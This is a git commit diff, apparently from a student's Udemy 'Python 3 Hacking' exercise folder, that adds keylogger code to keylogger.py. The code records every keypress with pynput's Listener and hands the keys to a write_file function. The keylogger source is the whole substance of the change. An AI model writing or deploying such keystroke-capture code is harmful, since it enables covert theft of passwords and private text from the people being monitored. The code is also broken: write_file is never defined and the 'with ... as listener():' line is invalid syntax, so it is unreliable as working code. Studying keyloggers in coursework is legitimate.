4dbd3934b3324e53af9681ca3e70a29f7f982356
albert18 <erertech@gmail.com>
2022-12-20 17:19:02 +0300

    update

--- 4. Udemy/1. Python 3 Hacking/7. Keylogger/keylogger.py
+++ 4. Udemy/1. Python 3 Hacking/7. Keylogger/keylogger.py
@@ -1,2 +1,20 @@
 import os
 from pynput.keyboard import Listener
+
+keys = []
+count = 0
+
+def on_press(key):
+    global keys, count
+    
+    keys.append(key)
+    count += 1
+    
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+    
+
+with Listener(on_press=on_press) as listener():
+    listener.join()
